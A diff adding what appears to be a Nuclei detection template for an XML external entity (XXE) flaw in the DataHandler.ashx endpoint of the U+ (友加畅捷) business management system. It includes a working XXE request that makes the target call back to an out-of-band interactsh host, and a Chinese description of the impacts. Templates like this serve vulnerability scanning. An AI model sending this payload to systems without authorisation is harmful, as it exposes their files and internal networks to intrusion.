@@ -1,0 +1,40 @@
+id: u-plus-DataHandler-xxe
+info:
+  name: 友加畅捷管理系统 DataHandler.ashx XXE漏洞
+  author: leadlife
+  severity: critical
+  description: 友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理软件，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。该系统DataHandler.ashx下的SaveData方法存在 XML实体注入（XXE）漏洞，是由于其在处理XML输入时，未能有效禁用外部实体加载所导致。攻击者可以通过构造恶意的XML数据，并在其中引用外部实体，当系统解析这些未经严格过滤的XML数据时，便会触发漏洞。成功利用此漏洞可能导致多种严重的安全风险，包括但不限于敏感信息泄露（如读取系统文件）、执行任意系统命令、对内网进行端口扫描、攻击内部网络服务，甚至发起拒绝服务（DoS）攻击等。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/gblyfu2n8yntsuzq
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: oob,xxe,u-plus
+
+http:
+  - raw:
+      - |
+        POST /Report/DataHandler.ashx?Type=SaveData HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
+        %remote;]>
+        <root/>
+      
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
